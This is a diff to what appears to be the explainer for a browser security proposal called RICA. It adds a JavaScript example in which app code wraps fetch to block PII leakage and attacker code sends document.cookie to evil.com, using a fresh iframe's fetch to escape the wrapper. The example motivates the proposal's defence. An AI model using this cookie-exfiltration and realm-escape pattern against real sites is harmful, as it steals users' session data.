@@ -14,7 +14,27 @@ iframe.onload = () => iframe.style.display = 'block';
 document.body.appendChild(iframe);
 ```
 
-RICA attempts to provide this from a **security** point of view, which requires addressing [same origin realms](#Same-Origin-Realm) initialization significantly different.
+RICA attempts to provide this from a **security** point of view, which requires addressing [same origin realms](#Same-Origin-Realm) initialization significantly different, because of how [same origin realms](#Same-Origin-Realm) can be manipulated against security mechanizms the app might wish to dictate - for example:
+
+```javascript
+// code by app - redefine fetch API to not allow leakage of PII
+const realFetch = window.fetch;
+window.fetch = function(resource, options) {
+  if (containsPII(resource, options) {
+    throw new Error(`fetch to "${resource}" is blocked for containing sensitive PII!`);
+  }
+  return realFetch.call(this, resource, options);
+};
+
+// code by attacker - easily escape protection by using a fresh fetch API instance from a new same origin realm
+const url = `https://evil.com/stealPII?cookie=` + document.cookie;
+try {
+  fetch(url);
+} catch (err) {
+  const realm = document.body.appendChild(document.createElement('iframe')).contentWindow;
+  realm.fetch(url);
+}
+```
 
 ## Table of contents
  
